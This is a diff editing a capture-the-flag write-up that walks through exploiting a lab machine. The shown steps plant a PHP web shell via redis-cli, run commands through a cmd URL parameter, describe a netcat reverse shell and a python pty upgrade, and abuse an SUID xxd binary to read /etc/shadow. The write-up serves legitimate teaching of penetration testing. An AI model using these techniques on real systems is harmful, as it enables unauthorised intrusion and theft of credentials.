@@ -92,7 +92,7 @@ after a failed attempt it seems to work. Now we need to test this out. If we did
 
 To do that we need to provide a command like this: `{MachineIP}shell.php?cmd=whoami`
 
-That didn't work, turns out I forgot an important step (what a surprise!), we need to save the changes in ready by running `save`.
+That didn't work, turns out I forgot an important step (what a surprise!), we need to save the changes in redis-cli by running `save`.
 
 
 ![We re-test our proof of time](https://i.imgur.com/LuK5PD1.png)
@@ -102,7 +102,7 @@ This time we get some information back, with this we can probably run a reverse 
 ![There is a vianka user](https://i.imgur.com/LekQt31.png)
 
 Let's see if we can get the user.txt flag that could very well be inside `vianka` folder.
-let's say something like this: `cat /home/vianka/user.txt` we add that to our URL command like this: `{MachineIP}shell.php?cmd=cat /home/vianka/user.txt`.
+let's say something like this: `cat /home/vianka/user.txt` we add that to our URL command like this: `{MachineIP}/shell.php?cmd=cat /home/vianka/user.txt`.
 
 Let's give that a try:
 
@@ -139,20 +139,21 @@ Let's see if we can get a reverse shell by running in the URL a netcat connectio
 We got a reverse shell, a really basic shell. Let's see if we can upgrade it to a python TTY by running the following command `python -c 'import pty; pty.spawn("/bin/sh")'`
 
 ![We stabilize the shell a bit](https://i.imgur.com/mGUqMF0.png)
+Mmm not sure that worked, anyway let's move on. 
 
 
 Now let's upload linPEAS to see if we can find a way to get root or the password for www-data. Remember to make linpeas executable first `chmod +x linpeas.sh` after uploading.
 
 ![Linpeas Results](https://i.imgur.com/xy6uGr2.png)
 
-Linpeas found that `xxd` binary has root permissions, let's see if `GTFOBins` has a way of exploiting it for us:
+Linpeas found that `xxd` binary has root permissions, let's see if `GTFOBins` has a way of exploiting it:
 
 > Check out GTFObins [here](https://gtfobins.github.io/gtfobins/xxd/)
 
 Let's see if we can read `etc/shadow` by exploiting this file as suggested by GTFOBins
 
 ```sh
-LFILE=ect/shadow
+LFILE=etc/shadow
 xxd "$LFILE" | xxd -r
 ```
 
